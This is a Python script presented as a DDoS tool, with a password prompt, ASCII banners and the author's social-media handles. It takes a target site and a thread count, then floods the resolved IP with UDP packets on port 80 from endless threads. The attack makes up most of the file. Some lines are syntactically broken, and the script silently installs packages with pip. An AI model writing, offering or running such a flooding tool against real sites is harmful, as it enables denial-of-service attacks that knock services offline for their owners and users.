password = input("enter youre pass : ")
while password != ("AMI-NOT"):
	print("password ×")
	password = input("enter youre pass : ")
print("pasword☆")













#Noob Editors
#Posy you mother Editor
from colorama import init, Fore
init()
from random import choice, randint
print(------AMI-NOT------
print(Fore.BLUE+'''
  








                   _               _
                  (_)             | |
    __ _ _ __ ___  _   _ __   ___ | |_
   / _` | '_ ` _ \| | | '_ \ / _ \| __|
  | (_| | | | | | | | | | | | (_) | |_
   \__,_|_| |_| |_|_| |_| |_|\___/ \__|''')



import time
from time import sleep
import socket
import _thread
import sys
import os
from colorama import Fore, Back
	
try:
	import rainbowtext, pyfiglet
except:
	os.system ("pip install rainbowtext")
	os.system ("pip install pyfiglet")

os.system ("clear")

print (rainbowtext.text(pyfiglet.figlet_format("DDOS")))
print (f"\t [*]Creator:{Fore.YELLOW} AMI-NOT")
foni = f"""{Fore.RED}
#################################
#                               #      {Fore.RED}<<<ddoser AMI >>>
#                               #
#‌        {Fore.YELLOW}AMI-NOT{Fore.RED}         #     
#                               # 
#                               #
#################################\n\n"""

for c in foni:
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep(0.03)
    
print (Back.RED+Fore.WHITE+"[*]GitHub: https://github.com/AMI-NOT\n[*]TelegramID: @mr_ami_not\n[*]instagramID: @me_ami.not\033[0m\n")

site = input(Fore.RED+"\t[+]Enter your site url/=> ")
thread_count = int(input("\t[+]Enter your thread/=> "))
    
sleep(0.5)
print (Fore.YELLOW+"\n>>>>>>>")
sleep(0.5)
print (Fore.BLUE+"\n>>>>>>>>>>>>")
sleep(0.5)
print (Fore.GREEN+"\n>>>>>>>>>>>>>>>>>\n")
    
sleep(0.5)
print (Fore.RED+"\n\t!START")
	
sleep(0.5)
t = time.localtime(time.time())
localtime = time.asctime(t)
hh = "Current Time:" + time.asctime(t)

print(hh);

sleep(1)
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'AMI- NOT'
print("UDP target IP:",ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(Fore.RED+"[*]Packet Sent The"+" "+Fore.YELLOW+site,thread_count)
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" +str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
